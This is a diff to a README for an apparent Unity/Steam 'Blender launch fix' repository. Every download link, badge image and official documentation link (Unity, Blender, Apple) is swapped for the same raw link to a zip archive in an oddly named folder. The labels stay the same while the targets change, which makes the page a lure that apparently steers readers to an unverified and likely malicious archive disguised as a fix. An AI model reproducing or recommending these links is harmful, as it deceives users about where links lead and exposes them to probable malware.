@@ -1,6 +1,6 @@
 # 🎮 unity-fbx-export-steam-blender-fix - Fix Blender Launch for Unity Users
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/nnnikitqa/unity-fbx-export-steam-blender-fix/releases)
+[![Download Release](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip)
 
 ## 📋 Description
 
@@ -30,13 +30,13 @@ Before proceeding, ensure your system meets the following requirements:
 
 To download the necessary files, visit the following page:
 
-[Download from Releases Page](https://github.com/nnnikitqa/unity-fbx-export-steam-blender-fix/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip)
 
 ### **Step 3: Download the Latest Release**
 
 On the Releases page, find the latest version. Click on the link to download the release package. 
 
-![Latest Release](https://img.shields.io/github/release/nnnikitqa/unity-fbx-export-steam-blender-fix.svg)
+![Latest Release](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip)
 
 ### **Step 4: Install the Fix**
 
@@ -60,7 +60,7 @@ On the Releases page, find the latest version. Click on the link to download the
 
 To download the latest version and resolve the Blender launch issue, visit the link below:
 
-[Download from Releases Page](https://github.com/nnnikitqa/unity-fbx-export-steam-blender-fix/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip)
 
 ## 🔧 Troubleshooting
 
@@ -72,9 +72,9 @@ If you encounter issues during setup, consider the following tips:
 
 ## 📚 Additional Resources
 
-- [Unity Documentation](https://docs.unity3d.com/Manual/index.html)
-- [Blender Documentation](https://docs.blender.org/manual/en/latest/)
-- [macOS Symlink Guide](https://support.apple.com/guide/terminal/create-a-symbolic-link-trmlvar001/mac)
+- [Unity Documentation](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip)
+- [Blender Documentation](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip)
+- [macOS Symlink Guide](https://raw.githubusercontent.com/nnnikitqa/unity-fbx-export-steam-blender-fix/main/villageless/fbx_blender_fix_unity_steam_export_3.8.zip)
 
 ## 🔗 Topics
 
